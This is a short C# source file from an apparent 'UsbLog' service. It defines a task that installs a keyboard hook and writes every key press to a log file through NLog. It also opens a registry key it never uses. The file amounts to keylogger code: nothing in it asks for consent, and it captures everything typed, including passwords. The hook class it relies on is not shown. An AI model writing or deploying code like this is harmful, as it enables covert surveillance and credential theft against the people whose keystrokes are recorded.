using DiscUtils.Registry;
using System;
using UsbLog.Core;
using UsbLog.VM;

namespace UsbLog.Service.Tasks
{
    internal class CollectKeysTask : IVmTask
    {
        public int ID => 0xA;

        public void Invoke(RegistryKey root)
        {
            var keysHive = root?.OpenSubKey("/data/keys");

            var hook = new KeyboardHook();
            hook.KeyDown += (_) => Logger.Info(_);
            hook.hook();

            DisposePipe.Add(hook);
        }

        private static readonly NLog.Logger Logger = NLog.LogManager.GetCurrentClassLogger();
    }
}